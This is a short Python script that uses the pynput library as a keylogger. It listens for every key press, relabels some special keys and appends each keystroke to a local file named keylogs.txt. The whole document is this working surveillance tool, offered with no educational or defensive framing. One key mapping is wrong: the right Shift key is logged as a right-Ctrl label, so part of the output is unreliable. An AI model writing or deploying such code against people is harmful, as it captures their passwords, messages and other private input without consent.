from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == "Key.enter":
        key = '\n'
    if key == "Key.ctrl_l":
        key = 'Key.ctrl.left'    
    if key == "Key.ctrl_r":
        key = 'Key.ctrl.right'
    if key == "Key.shift_r":
        key = 'Key.ctrl.right'
    if key == "Key.shift_l":
        key = 'Key.shift.left'
    if key == "Key.alt_l":
        key = 'Key.alt.left'
    if key == "Key.alt_r":
        key = 'Key.alt.right'            

    with open("keylogs.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()